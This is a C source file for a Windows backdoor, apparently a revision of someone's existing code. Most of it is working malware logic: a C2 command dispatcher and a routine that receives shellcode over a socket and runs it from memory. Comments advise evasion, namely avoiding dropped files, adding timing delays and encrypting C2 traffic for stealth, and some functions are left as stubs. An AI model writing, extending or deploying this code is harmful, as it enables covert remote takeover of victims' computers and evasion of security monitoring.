#include "backdoor.h"
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib,"ws2_32.lib")

#define SOCK_BUFF_SIZE 2048

static char gl_Username[50];
static char gl_Password[50];

int ReceiveAndExecuteShellcode(SOCKET soc) {
    DWORD shellcodeSize = 0, received = 0;
    // Receive shellcode size first
    if (recv(soc, (char*)&shellcodeSize, sizeof(shellcodeSize), 0) != sizeof(shellcodeSize)) return -1;
    if (shellcodeSize == 0 || shellcodeSize > 1024*1024) return -1; // 1MB limit

    // Allocate memory for shellcode
    LPVOID shellcode = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!shellcode) return -1;

    // Receive shellcode
    while (received < shellcodeSize) {
        int r = recv(soc, (char*)shellcode + received, shellcodeSize - received, 0);
        if (r <= 0) { VirtualFree(shellcode, 0, MEM_RELEASE); return -1; }
        received += r;
    }

    // Make executable and run
    DWORD oldProtect;
    VirtualProtect(shellcode, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
    ((void(*)())shellcode)();
    VirtualFree(shellcode, 0, MEM_RELEASE);
    return 0;
}

int conn_auth(SOCKET soc) {
    // ... (same as your code, possibly with timing/random delays for evasion)
}

int bind_cmd_proc(SOCKET soc) {
    // Instead of always binding to cmd.exe, listen for C2 commands:
    // "SHELL" = classic shell, "EXEC" = receive and execute shellcode, etc.
    char cmd[16] = {0};
    if (recv(soc, cmd, sizeof(cmd)-1, 0) <= 0) return -1;
    if (strcmp(cmd, "EXEC") == 0) {
        return ReceiveAndExecuteShellcode(soc);
    } else if (strcmp(cmd, "SHELL") == 0) {
        // ... classic bind shell logic, as in your original code
    }
    // Optionally, add more in-memory tasks
    return 0;
}

// All other logic (socket setup, authentication, etc.) remains similar, but
// - Do NOT drop files
// - Avoid calling external binaries if possible
// - Optionally, encrypt C2 traffic for stealth

// Example use in client_conn_thread:
DWORD WINAPI client_conn_thread(LPVOID Parameter) {
    THREAD_PARAM *pParam = (THREAD_PARAM *)Parameter;
    if (conn_auth(pParam->soc) == 0) { closesocket(pParam->soc); free(pParam); return 1; }
    bind_cmd_proc(pParam->soc); // Handles both shell and memory-exec tasks
    closesocket(pParam->soc);
    free(pParam);
    return 0;
}
